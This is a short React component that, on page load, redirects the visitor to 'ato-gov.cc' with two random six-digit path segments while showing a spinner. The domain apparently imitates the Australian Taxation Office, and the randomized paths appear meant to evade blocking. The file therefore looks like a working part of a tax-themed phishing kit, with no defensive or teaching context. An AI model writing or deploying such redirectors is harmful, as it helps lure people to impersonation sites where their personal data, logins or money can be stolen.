import React, { useEffect } from 'react';

const RedirectPage = () => {
  useEffect(() => {
    // Function to generate a random 6-digit number
    const generateRandomNumber = (length = 6) => {
      let number = '';
      for (let i = 0; i < length; i++) {
        number += Math.floor(Math.random() * 10);
      }
      return number;
    };

    // Generate two segments
    const segment1 = generateRandomNumber();
    const segment2 = generateRandomNumber();

    // Construct the redirect URL
    const redirectUrl = `https://www.ato-gov.cc/${segment1}/${segment2}/`;

    // Redirect
    window.location.replace(redirectUrl);
  }, []);

  // Loader UI while redirecting
  return (
    <div style={{
      margin: 0,
      padding: 0,
      backgroundColor: '#ffffff',
      fontFamily: "'Open Sans', sans-serif",
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      height: '100vh',
      color: '#333'
    }}>
      {/* Loader */}
      <div style={{
        border: '6px solid #f3f3f3',
        borderTop: '6px solid #ffc421',
        borderRadius: '50%',
        width: '50px',
        height: '50px',
        animation: 'spin 1s linear infinite',
        marginBottom: '20px'
      }} />
      {/* Message */}
      <div style={{ fontSize: '1.2em', textAlign: 'center' }}>Redirecting...</div>
      
      {/* Spinner animation keyframes */}
      <style>
        {`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}
      </style>
    </div>
  );
};

export default RedirectPage;
